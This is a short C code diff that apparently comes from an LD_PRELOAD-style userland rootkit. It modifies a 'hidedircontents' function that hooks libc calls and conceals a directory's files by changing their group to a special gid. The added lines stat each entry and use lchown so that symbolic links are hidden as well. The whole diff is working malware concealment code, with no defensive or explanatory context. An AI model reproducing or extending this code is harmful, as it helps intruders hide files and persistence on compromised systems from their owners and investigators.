@@ -1,8 +1,9 @@
 void hidedircontents(const char *path, gid_t newgid){
     DIR *dp;
     struct dirent *dir;
+    struct stat sbuf;
 
-    hook(COPENDIR, CREADDIR);
+    hook(COPENDIR, CREADDIR, C__LXSTAT, CLCHOWN);
 
     dp = call(COPENDIR, path);
     if(dp == NULL) return;
@@ -13,7 +14,13 @@ void hidedircontents(const char *path, gid_t newgid){
 
         char tmp[strlen(path)+strlen(dir->d_name)+3];
         snprintf(tmp, sizeof(tmp), "%s/%s", path, dir->d_name);
-        chown_path(tmp, newgid);
+
+        memset(&sbuf, 0, sizeof(struct stat));
+        if((long)call(C__LXSTAT, _STAT_VER, tmp, &sbuf) < 0)
+            continue;
+
+        if(S_ISLNK(sbuf.st_mode)) call(CLCHOWN, tmp, newgid, newgid);
+        else chown_path(tmp, newgid);
     }
     closedir(dp);
     chown_path(path, newgid);
